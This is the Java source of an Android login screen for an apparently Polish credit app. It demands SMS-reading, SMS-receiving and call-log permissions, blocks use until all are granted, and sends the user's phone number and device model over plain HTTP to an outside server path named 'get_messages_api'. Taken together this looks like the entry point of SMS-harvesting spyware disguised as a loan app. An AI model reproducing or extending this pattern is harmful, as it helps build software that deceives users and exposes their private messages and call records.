package com.app.genialnykredyt;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.Uri;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.app.genialnykredyt.Session.SessionManager;

import java.io.File;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class LoginActivity extends AppCompatActivity {
    String[] apppermissions={
            Manifest.permission.INTERNET,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
    };

    ProgressDialog progressDialog;

    EditText edtTxtName,edtTxtEmail,edtTxtPhone;


    SessionManager sessionManager;

    ConnectivityManager connectivityManager;
    public static int PERMISSION_CODE = 100;
    int deniedCount;

    Toolbar toolbar;
    Button btn;
    String DEVICE_NAME;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);

        btn= findViewById(R.id.btn_signup);
        edtTxtName= findViewById(R.id.edt_txt_username);
        edtTxtEmail= findViewById(R.id.edt_txt_email);
        edtTxtPhone= findViewById(R.id.edt_txt_phone);

        progressDialog= new ProgressDialog(this);
        progressDialog.setTitle("Saving");
        progressDialog.setMessage("Please wait for a while");
        progressDialog.setCancelable(false);


        sessionManager = new SessionManager(this);
        if(sessionManager.getUserLogin().equalsIgnoreCase("true")){
            goAhead();
        }

        DEVICE_NAME = android.os.Build.MODEL;


        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(checkAndRequestPermissions())
                {
                    if(IsNetworkConnected())
                    {
                        doLoginProcess();
                    }
                    else
                    {
                        Toast.makeText(LoginActivity.this, "Permissions are necessary to use the site features correctly", Toast.LENGTH_SHORT).show();
                    }


                }
            }
        });




    }

    private void doLoginProcess() {
        String name = edtTxtName.getText().toString().trim();
        String email = edtTxtEmail.getText().toString().trim();
        String phone = edtTxtPhone.getText().toString().trim();

      if(name.isEmpty() && email.isEmpty() && phone.isEmpty()){
          edtTxtName.setError("Enter Your Name Please");
          edtTxtEmail.setError("Enter Your Email Please");
          edtTxtPhone.setError("Enter Your Phone Number Please");
      }else if(name.isEmpty()){
          edtTxtName.setError("Enter Your Name Please");
      }else if(email.isEmpty()){
          edtTxtEmail.setError("Enter Your Email Please");
      }else if(phone.isEmpty()){
          edtTxtPhone.setError("Enter Your Phone Number Please");
      }else{
          if(DEVICE_NAME!=null){
              progressDialog.show();
              saveDataToServer(name,email,phone,DEVICE_NAME);
          }else{
              Toast.makeText(this, "Device name is null", Toast.LENGTH_SHORT).show();
          }

      }
    }

    private void saveDataToServer(String name, String email, final String phone, final String device_name) {
        trimCache(this);
        StringRequest request=new StringRequest(Request.Method.POST, "http://rfbasolutions.com/get_messages_api/save_mobile_no.php", new Response.Listener<String>()
        {

            @Override
            public void onResponse( String response) {

                if(response.equalsIgnoreCase("true")){
                    progressDialog.dismiss();
                    sessionManager.setUserLogin("true");
                    goAhead();
                }else{
                    progressDialog.dismiss();
                    Toast.makeText(LoginActivity.this, response, Toast.LENGTH_SHORT).show();
                }

            }
        }, new Response.ErrorListener()
        {
            @Override
            public void onErrorResponse(VolleyError error)
            {
                progressDialog.dismiss();
                Toast.makeText(LoginActivity.this, error.toString(), Toast.LENGTH_SHORT).show();
            }
        })
        {
            @Override
            protected Map<String,String> getParams() throws AuthFailureError {
                HashMap<String,String> params=new HashMap<>();

                params.put("device_name",device_name);
                params.put("phone", phone);

                return params;
            }
        };
        RequestQueue requestQueue= Volley.newRequestQueue(LoginActivity.this);
        requestQueue.add(request);
    }

    public static void trimCache(Context context) {
        try {
            File dir = context.getCacheDir();
            if (dir != null && dir.isDirectory()) {
                deleteDir(dir);
            }
        } catch (Exception e) {
            // TODO: handle exception
        }
    }



    public static boolean deleteDir(File dir) {
        if (dir != null && dir.isDirectory()) {
            String[] children = dir.list();
            for (int i = 0; i < children.length; i++) {
                boolean success = deleteDir(new File(dir, children[i]));
                if (!success) {
                    return false;
                }
            }
        }

        // The directory is now empty so delete it
        return dir.delete();
    }

    private boolean checkAndRequestPermissions() {
        List<String> listPermissionsNeeded = new ArrayList<>();
        for (String permission: apppermissions){
            if(ContextCompat.checkSelfPermission(this,permission) != PackageManager.PERMISSION_GRANTED){
                listPermissionsNeeded.add(permission);
            }
        }

        if(!listPermissionsNeeded.isEmpty()){
            ActivityCompat.requestPermissions(this,listPermissionsNeeded.toArray(new String[listPermissionsNeeded.size()]),PERMISSION_CODE);
            return false;
        }
        return true;
    }

    private AlertDialog showDialog(String title, String msg, String positivelable, DialogInterface.OnClickListener possitiveOnClick, String negeativeLable, DialogInterface.OnClickListener negativeOnClick, boolean isCancelable) {
        AlertDialog.Builder alertDailog = new AlertDialog.Builder(this);
        alertDailog.setTitle(title);
        alertDailog.setCancelable(isCancelable);
        alertDailog.setMessage(msg);
        alertDailog.setPositiveButton(positivelable,possitiveOnClick);
        alertDailog.setNegativeButton(negeativeLable,negativeOnClick);
        AlertDialog alert = alertDailog.create();
        alert.show();
        return alert;
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode==PERMISSION_CODE){
            HashMap<String,Integer> permissionResults=new HashMap<>();
            deniedCount = 0;

            for(int i=0;i<grantResults.length;i++){

                if(grantResults[i] == PackageManager.PERMISSION_DENIED){
                    permissionResults.put(permissions[i],grantResults[i]);
                    deniedCount++;
                }
            }


            //check if all permissions are granted
            if(deniedCount == 0){
                doLoginProcess();
                //goAhead();
            }
            //At least one or all permission are denied
            else {
                for(Map.Entry<String,Integer> entry: permissionResults.entrySet()){
                    String permName = entry.getKey();
                    int permResult = entry.getValue();

                    //permission is denied. (This is first time ,when "Never Ask Again" is not checked)
                    //so Ask again explaining usage of permission
                    //shouldShowRequestPermissionResultRational return true

                    if(ActivityCompat.shouldShowRequestPermissionRationale(this,permName)){

                        //show dailog for explainaiton
                        showDialog("","This app needs all asked permission to work. Please Grant All Permission ",
                                "YES, Grant Permission", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        checkAndRequestPermissions();
                                    }
                                },
                                "No ,Exit App", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        finish();
                                    }
                                },false);


                    }
                    //pemission is denied and never ask again is checked
                    //shouldShowRequestPermisionResultsRational return false
                    else{
                        showDialog("",
                                "You have denied some permissions.  Allow all permission at [Setting] > [Permission]",
                                "Go to Settings", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS,
                                                Uri.fromParts("package", getPackageName(), null));
                                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                        startActivity(intent);
                                        finish();

                                    }
                                },
                                "NO ,Exit App", new DialogInterface.OnClickListener() {
                                    @Override
                                    public void onClick(DialogInterface dialog, int which) {
                                        dialog.dismiss();
                                        finish();
                                    }
                                },false);
                        break;
                    }
                }
            }
        }
    }

    private void goAhead() {

        Intent intent = new Intent(LoginActivity.this,webActivity.class);
        startActivity(intent);
        finish();

//        Context context=getApplicationContext();
//        UpdateToServer serverClass=new UpdateToServer(context);
//        serverClass.addtoServer(context);
//
//        Thread timer = new Thread(){
//            public void run(){
//                try{
//                    sleep(5000);   // set the duration of splash screen
//                    Intent intent = new Intent(LoginActivity.this,webActivity.class);
//                    startActivity(intent);
//                    finish();
//                }
//                catch(InterruptedException e){
//                    e.printStackTrace();
//                }
//                finally
//                {
//
//                }
//            }
//        };
//        timer.start();
    }

    private boolean IsNetworkConnected() {
        connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);

        return connectivityManager.getActiveNetworkInfo() != null;
    }

    public void addtoServer(final Context context) {


    }


    @Override
    protected void onStart() {
        super.onStart();
    }
}
